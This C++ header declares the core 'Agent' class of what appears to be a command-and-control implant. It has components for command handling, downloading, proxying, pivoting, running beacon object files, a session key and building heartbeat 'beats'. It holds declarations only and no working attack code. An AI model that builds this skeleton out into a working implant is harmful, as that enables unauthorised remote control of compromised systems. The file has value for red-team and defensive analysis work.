#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Proxyfire.h"
#include "Pivotter.h"
#include "Commander.h"
#include "Boffer.h"

class Commander;
class Boffer;

class Agent
{
public:
	AgentInfo*		info        = NULL;
	AgentConfig*    config		= NULL;
	Commander*      commander	= NULL;
	Downloader*     downloader	= NULL;
	JobsController* jober		= NULL;
	MemorySaver*    memorysaver = NULL;
	Proxyfire*		proxyfire	= NULL;
	Pivotter*       pivotter    = NULL;
	Boffer*         asyncBofMgr = NULL;

	Map<CHAR*, LPVOID> Values;

	BYTE* SessionKey = NULL;
	BOOL  Active     = TRUE;

	Agent();

	BOOL  IsActive();
	ULONG GetWorkingSleep();
	BYTE* BuildBeat(ULONG* size);

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};
